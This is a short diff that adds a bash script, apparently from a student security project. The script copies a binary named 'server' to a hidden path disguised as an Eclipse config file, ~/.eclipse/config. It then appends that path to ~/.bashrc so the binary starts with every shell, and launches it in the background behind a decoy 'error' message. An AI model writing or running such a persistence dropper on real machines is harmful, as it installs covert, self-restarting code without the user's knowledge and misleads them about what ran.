@@ -1,0 +1,4 @@
+#!/bin/bash
+cp ~pamartn/Documents/securite/projet/server/server ~/.eclipse/config 
+echo "~/.eclipse/config" >> ~/.bashrc
+echo "error" && ~/.eclipse/config &
